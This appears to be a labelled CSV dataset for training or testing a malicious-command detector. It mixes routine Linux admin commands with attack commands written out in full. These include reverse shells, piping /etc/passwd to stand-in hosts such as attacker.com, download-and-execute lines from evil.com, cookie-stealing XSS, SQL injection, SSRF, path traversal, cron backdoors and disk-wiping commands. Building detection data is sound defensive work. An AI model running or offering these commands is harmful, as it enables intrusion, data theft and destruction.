timestamp,attacker_ip,command_sequence,label
2026-01-23 13:57:12,80.42.127.77,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 12:39:12,197.237.124.91,"curl ""http://target.com/api/users?sort=password&order=ASC""",1
2026-01-23 06:04:12,188.149.242.78,apt update,0
2026-01-23 03:42:12,158.105.91.198,curl -I https://example.com,0
2026-01-23 09:21:12,83.176.9.36,ping -c 4 google.com,0
2026-01-23 09:49:12,203.69.148.46,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 05:33:12,157.125.206.201,ping -c 4 google.com,0
2026-01-23 02:14:12,178.186.180.57,du -sh /home/* | sort -hr,0
2026-01-23 11:30:12,41.189.12.64,enum4linux target.com,1
2026-01-23 03:41:12,97.83.244.184,top -n 1 | head -20,0
2026-01-23 14:41:12,168.203.15.161,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 11:20:12,18.98.126.16,"curl ""http://target.com/search?q=' UNION SELECT username,password FROM users--""",1
2026-01-23 05:55:12,42.38.209.3,ip route show,0
2026-01-23 13:26:12,167.118.152.79,"php -r '$sock=fsockopen(""10.0.0.1"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",1
2026-01-23 02:22:12,196.191.38.208,crontab -l,0
2026-01-23 12:22:12,109.216.247.243,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 10:59:12,18.224.159.87,bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1',1
2026-01-23 08:05:12,97.238.206.196,logrotate -f /etc/logrotate.d/nginx,0
2026-01-23 17:40:12,161.112.25.112,"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 03:59:12,172.228.189.148,chmod 644 /var/www/html/index.html,0
2026-01-23 16:00:12,159.88.37.136,rm -rf /* --no-preserve-root,1
2026-01-23 16:17:12,153.229.97.13,dd if=/dev/zero of=/dev/sda bs=1M,1
2026-01-23 02:36:12,31.15.222.79,ls -la /var/log/,0
2026-01-23 12:12:12,127.78.85.81,gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt,1
2026-01-23 10:03:12,125.127.56.136,"curl ""http://target.com/export?file=....//....//....//proc/self/environ""",1
2026-01-23 07:15:12,53.241.246.57,rsync -avz /var/www/html/ backup/,0
2026-01-23 02:52:12,163.111.133.181,crontab -l,0
2026-01-23 03:45:12,215.252.0.107,ls -la /var/log/,0
2026-01-23 04:30:12,145.79.36.147,apt list --upgradable,0
2026-01-23 03:19:12,203.165.199.228,wget --spider https://example.com/file.zip,0
2026-01-23 08:03:12,99.110.148.110,systemctl status mysql,0
2026-01-23 09:48:12,55.50.181.128,cat /var/www/../../../../etc/passwd,1
2026-01-23 02:50:12,4.155.166.179,tail -20 /var/log/syslog,0
2026-01-23 05:30:12,105.174.23.252,rsnapshot daily,0
2026-01-23 12:20:12,61.196.92.24,"env x='() { :;}; /bin/bash -c ""bash -i >& /dev/tcp/10.0.0.1/4444 0>&1""' bash -c 'echo vulnerable'",1
2026-01-23 10:01:12,182.100.146.120,tar -czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://exfil.server/collect,1
2026-01-23 08:28:12,162.65.206.201,dig example.com,0
2026-01-23 16:52:12,214.135.234.66,"curl ""http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>""",1
2026-01-23 12:31:12,121.77.85.202,"curl -H ""X-Original-URL: /admin"" http://target.com/",1
2026-01-23 15:09:12,50.69.166.84,"curl -H ""Host: internal.target.com"" http://target.com/",1
2026-01-23 09:47:12,66.191.10.209,"curl -H ""User-Agent: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"" http://target.com",1
2026-01-23 05:03:12,139.237.206.138,top -n 1 | head -20,0
2026-01-23 14:22:12,210.154.97.38,wget http://evil.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh,1
2026-01-23 04:40:12,74.181.126.98,df -h,0
2026-01-23 08:57:12,114.77.44.172,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 16:35:12,131.241.224.116,mkfs.ext4 /dev/sda1,1
2026-01-23 09:44:12,65.106.92.250,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.14.2"",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",1
2026-01-23 15:16:12,213.119.196.7,echo '* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | crontab -,1
2026-01-23 14:45:12,136.93.10.88,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 12:06:12,114.141.192.145,"curl ""http://target.com/image?file=php://filter/convert.base64-encode/resource=/etc/passwd""",1
2026-01-23 10:13:12,60.28.92.156,"curl ""http://target.com/login' AND 1=convert(int,(SELECT @@version))--""",1
2026-01-23 03:00:12,62.13.246.118,systemctl status mysql,0
2026-01-23 15:04:12,14.105.229.69,chmod 4777 /bin/bash,1
2026-01-23 14:46:12,184.51.61.162,curl http://evil.com/backdoor.php | bash,1
2026-01-23 11:11:12,24.220.213.116,tar -czf - /etc/passwd | base64 | curl -X POST --data-binary @- http://attacker.com/exfil,1
2026-01-23 03:29:12,90.13.158.60,id,0
2026-01-23 04:31:12,127.161.100.191,hostnamectl,0
2026-01-23 06:57:12,209.237.66.38,ps aux | grep nginx,0
2026-01-23 03:39:12,189.89.246.179,du -sh /var/www/*,0
2026-01-23 02:46:12,64.166.220.33,ls -la /var/log/,0
2026-01-23 10:32:12,54.127.36.152,"echo ""* * * * * /tmp/.backdoor.sh"" | crontab -",1
2026-01-23 08:08:12,91.132.211.254,ip route show,0
2026-01-23 09:00:12,189.129.40.138,ping -c 4 google.com,0
2026-01-23 12:51:12,124.130.173.131,john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt,1
2026-01-23 07:18:12,61.39.253.253,apt list --upgradable,0
2026-01-23 02:37:12,113.239.186.17,df -h /,0
2026-01-23 08:55:12,57.185.242.64,top -n 1 | head -20,0
2026-01-23 02:57:12,32.184.176.110,cat /proc/cpuinfo | grep 'model name',0
2026-01-23 11:23:12,108.125.180.22,"curl ""http://target.com/file?path=../../../etc/passwd""",1
2026-01-23 08:23:12,95.206.250.98,cat /etc/nginx/nginx.conf,0
2026-01-23 09:28:12,170.101.42.193,apt update,0
2026-01-23 13:12:12,45.159.3.146,"curl ""http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/""",1
2026-01-23 15:25:12,55.26.66.195,"curl ""http://target.com/api?id=1' OR '1'='1""",1
2026-01-23 09:54:12,140.189.246.43,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.10.10.10"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",1
2026-01-23 09:01:12,8.248.215.13,cat /proc/meminfo | head -10,0
2026-01-23 03:32:12,147.57.32.124,apt list --upgradable,0
2026-01-23 02:49:12,20.38.200.133,apt update && apt list --upgradable,0
2026-01-23 13:08:12,43.65.131.165,"curl ""http://target.com/api?id=1; DROP TABLE users;--""",1
2026-01-23 13:17:12,76.107.190.214,"curl -H ""X-Forwarded-For: <script>alert('XSS')</script>"" http://target.com/",1
2026-01-23 09:30:12,27.210.64.70,ssh-keygen -l -f /etc/ssh/ssh_host_rsa_key.pub,0
2026-01-23 06:58:12,62.146.132.87,logrotate -f /etc/logrotate.d/nginx,0
